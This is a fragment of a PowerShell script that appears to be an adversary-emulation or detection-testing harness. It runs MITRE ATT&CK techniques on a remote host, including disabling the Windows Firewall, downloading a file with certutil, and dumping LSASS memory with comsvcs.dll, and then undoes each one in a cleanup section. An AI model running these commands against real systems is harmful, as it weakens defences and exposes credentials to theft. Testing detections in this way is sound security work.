...
# 4. Defense Evasion: Disable Windows Firewall (T1562.004)
Invoke-RemotePS "Set-NetFirewallProfile -All -Enabled False"
...
# 16. Ingress Tool Transfer: Download file with certutil (T1105)
Invoke-RemotePS "certutil -urlcache -split -f http://example.com/test.txt $TempDir\test.txt"

# 17. Credential Access: LSASS Memory Dump via comsvcs.dll (T1003.001)
Invoke-RemotePS "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).ID $TempDir\lsass.dmpfull"
...
# 4. Re-enable Windows Firewall (set to default – enable on domain/private/public)
Invoke-RemotePS "Set-NetFirewallProfile -All -Enabled True"
...
# 16. Delete downloaded test.txt
Invoke-RemotePS "Remove-Item -Path $TempDir\test.txt -ErrorAction SilentlyContinue"

# 17. Delete lsass minidump
Invoke-RemotePS "Remove-Item -Path $TempDir\lsass.dmpfull -ErrorAction SilentlyContinue"
